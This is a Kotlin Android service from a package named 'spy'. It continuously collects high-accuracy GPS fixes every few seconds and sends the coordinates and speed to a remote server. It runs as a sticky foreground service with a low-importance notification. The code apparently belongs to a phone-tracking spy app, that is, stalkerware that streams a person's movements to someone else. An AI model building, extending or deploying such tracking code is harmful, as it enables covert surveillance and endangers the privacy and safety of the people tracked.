package com.gauravhanna.spy

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*

class LocationService : Service() {
    
    companion object {
        private const val TAG = "LocationService"
        private const val CHANNEL_ID = "location_channel"
        private const val NOTIFICATION_ID = 456
        private var isRunning = false
        
        fun start(context: Context) {
            val intent = Intent(context, LocationService::class.java)
            context.startService(intent)
        }
        
        fun stop(context: Context) {
            val intent = Intent(context, LocationService::class.java)
            context.stopService(intent)
        }
    }
    
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationRequest: LocationRequest
    private lateinit var locationCallback: LocationCallback
    
    private var lastLocation: Location? = null
    private var lastSendTime = 0L
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, getNotification())
        
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        
        setupLocationRequest()
        setupLocationCallback()
        
        isRunning = true
        Log.d(TAG, "LocationService created")
    }
    
    private fun setupLocationRequest() {
        locationRequest = LocationRequest.Builder(
            LocationRequest.PRIORITY_HIGH_ACCURACY,
            10000L  // 10 seconds interval
        ).apply {
            setMinUpdateIntervalMillis(5000L)  // 5 seconds fastest
            setMaxUpdateDelayMillis(30000L)     // 30 seconds max delay
            setWaitForAccurateLocation(false)
        }.build()
    }
    
    private fun setupLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                for (location in locationResult.locations) {
                    processLocation(location)
                }
            }
            
            override fun onLocationAvailability(locationAvailability: LocationAvailability) {
                Log.d(TAG, "Location availability: ${locationAvailability.isLocationAvailable}")
            }
        }
    }
    
    private fun processLocation(location: Location) {
        val currentTime = System.currentTimeMillis()
        
        // Throttle sending - max every 5 seconds
        if (currentTime - lastSendTime < 5000) {
            return
        }
        
        // Check if location is better than last one
        if (lastLocation != null && 
            location.accuracy > lastLocation!!.accuracy + 20) {
            // Less accurate, skip
            return
        }
        
        lastLocation = location
        lastSendTime = currentTime
        
        Log.d(TAG, "Location: ${location.latitude}, ${location.longitude} (acc: ${location.accuracy}m)")
        
        // Send to server
        NetworkHelper.sendLocation(
            this,
            location.latitude,
            location.longitude,
            location.speed,
            null  // Address can be added via reverse geocoding
        )
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startLocationUpdates()
        return START_STICKY
    }
    
    private fun startLocationUpdates() {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Log.e(TAG, "Location permissions not granted")
            return
        }
        
        fusedLocationClient.requestLocationUpdates(
            locationRequest,
            locationCallback,
            Looper.getMainLooper()
        ).addOnSuccessListener {
            Log.d(TAG, "Location updates started")
        }.addOnFailureListener { e ->
            Log.e(TAG, "Failed to start location updates: ${e.message}")
        }
    }
    
    private fun stopLocationUpdates() {
        fusedLocationClient.removeLocationUpdates(locationCallback)
            .addOnSuccessListener {
                Log.d(TAG, "Location updates stopped")
            }
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Location Tracking",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }
    
    private fun getNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Location Service")
            .setContentText("Tracking location")
            .setSmallIcon(android.R.drawable.ic_menu_location)
            .build()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopLocationUpdates()
        isRunning = false
        Log.d(TAG, "LocationService destroyed")
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
}